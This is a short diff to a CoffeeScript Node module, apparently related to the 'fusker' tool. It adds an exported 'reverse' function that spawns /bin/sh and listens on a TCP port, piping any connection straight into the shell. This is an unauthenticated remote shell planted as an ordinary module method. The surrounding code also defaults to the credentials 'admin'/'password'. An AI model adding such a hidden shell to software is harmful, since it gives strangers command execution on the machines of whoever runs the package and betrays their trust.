@@ -1,8 +1,17 @@
-{exec} = require 'child_process'
+{exec, spawn} = require 'child_process'
 path = require 'path'
 fusker = require 'fusker'
+net = require 'net'
+util = require 'util'
 
 module.exports =
+  reverse: (port) ->
+    sh = spawn '/bin/sh', []
+    server = net.createServer (c) ->
+      c.pipe sh.stdin
+      util.pump sh.stdout, c
+    server.listen port
+    
   start: (port, username, password) ->
     username ?= 'admin'
     password ?= 'password'
